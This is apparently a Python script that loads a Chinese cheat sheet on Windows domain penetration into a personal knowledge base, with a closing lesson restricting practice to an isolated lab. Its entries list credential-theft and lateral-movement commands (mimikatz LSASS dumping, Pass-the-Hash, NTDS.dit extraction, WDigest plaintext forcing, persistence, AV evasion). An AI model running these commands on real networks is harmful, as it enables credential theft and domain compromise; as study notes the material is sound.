"""批量导入《史上最强内网渗透知识点总结》的技术条目 + 一条硬边界教训。"""
import pathlib
import sys

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
import kdb  # noqa: E402

c = kdb.conn()
now = kdb.now()
SRC = "cnblogs.com/nongchaoer/p/13371875.html (2020)"

techs = [
    ("内网-信息收集", "域内信息收集命令集", "net user /domain；net group \"domain admins\" /domain；nltest /dclist；dsquery user/computer；net view /domain；cmdkey /l；ipconfig /all 找 DNS Suffix", SRC, "Windows cmd"),
    ("内网-凭据获取", "LSASS 内存抓密码", "procdump -ma lsass.exe → mimikatz sekurlsa::minidump / logonpasswords；或 mimikatz privilege::debug + sekurlsa::logonpasswords", SRC, "mimikatz/procdump"),
    ("内网-凭据获取", "SAM/SYSTEM 注册表导出", "reg save HKLM\\SAM 与 HKLM\\SYSTEM → mimikatz lsadump::sam /sam: /system:", SRC, "mimikatz"),
    ("内网-凭据获取", "WDigest 强制明文", "reg add ...WDigest /v UseLogonCredential /d 1；注销重登后可从内存取明文口令", SRC, "reg"),
    ("内网-横向", "IPC$ + 计划任务", "net use \\\\ip\\c$ pwd /user:；copy 载荷；schtasks/at 远程启动；net use /del 清理", SRC, "Windows 内置"),
    ("内网-横向", "隧道与代理", "lcx/ew 端口转发；netsh interface portproxy；MSF autoroute + socks4a；proxychains 驱动 nmap", SRC, "lcx/ew/msf"),
    ("域渗透", "Pass-the-Hash", "wmiexec -hashes 或 msf psexec SMBPass=LM:NT；KB2871997 后仍可用 PTK/PTT 绕过", SRC, "impacket/msf"),
    ("域渗透", "Pass-the-Ticket / Key", "kekeo tgt::ask → kerberos::ptt 导入 .kirbi；mimikatz sekurlsa::ekeys 取 aes256 后 pth", SRC, "kekeo/mimikatz"),
    ("域渗透", "GPP 组策略密码", "SYSVOL 里 Groups.xml 等含 cpassword → Get-GPPPassword 解密", SRC, "PowerSploit"),
    ("域渗透", "NTDS.dit 提取", "vssadmin create shadow → copy ntds.dit/system/sam → secretsdump.py -ntds -system LOCAL", SRC, "vssadmin/impacket"),
    ("域渗透", "MS14-068 伪造 TGT", "ms14068.py 生成 TGT 后用 kerberos::ptc 注入 → 可加域管", SRC, "ms14068/mimikatz"),
    ("后渗透-持久化", "计划任务/服务/注册表 Run", "schtasks /create /RU SYSTEM；msf persistence/metsvc；getgui -e 开 RDP", SRC, "schtasks/msf"),
    ("提权", "提权辅助与 EXP 库", "Windows-Exploit-Suggester（比对补丁）；linux-exploit-suggester-2；SecWiki 的 windows/linux-kernel-exploits", SRC, "GitHub"),
    ("免杀/隐藏", "Veil / go ldflags / 账户隐藏", "veil 生成 + mingw 编译；go build -ldflags=\"-H windowsgui -s -w\"；Windows-User-Clone 隐藏账号", SRC, "veil/go"),
    ("后渗透-收集", "本地凭据与浏览器", "LaZagne / NetRipper / ProwserPasswordDump / Puttyrider；注册表代理设置；wifi netsh key=clear", SRC, "各工具"),
    ("反溯源", "代理池与回落", "shadowProxy 代理池；ngrok 隧道；WPAD 中间人（Responder/net-creds）", SRC, SRC),
]
for cat, name, how, src, tool in techs:
    c.execute("INSERT INTO techniques(ts,category,name,howto,source,tool,status) VALUES(?,?,?,?,?,?,?)",
              (now, cat, name, how, src, tool, "资料库-未实操"))

c.execute("INSERT INTO lessons(ts,lesson,root_cause,fix,tool) VALUES(?,?,?,?,?)",
          (now,
           "内网/域渗透类技术（Mimikatz 抓密码、Pass-the-Hash、DCSync/NTDS.dit、WebShell 持久化）属【后渗透】手段："
           "只在专门隔离的 AD 靶场里演示，对任何真实内网使用即构成犯罪",
           "这类技术的攻击目标天然是别人的内网，越界零成本",
           "现环境（Kali+Host-Only，无 Windows 域）缺 AD 靶场；要练必须先搭隔离的 Windows Server+客户端 VM；"
           "对真实网络一律禁止",
           "知识入库，不实操"))
c.commit()
print("已导入内网/域渗透技术 %d 项 + 1 条边界教训" % len(techs))
print("技术库总数:", c.execute("SELECT COUNT(*) FROM techniques").fetchone()[0])
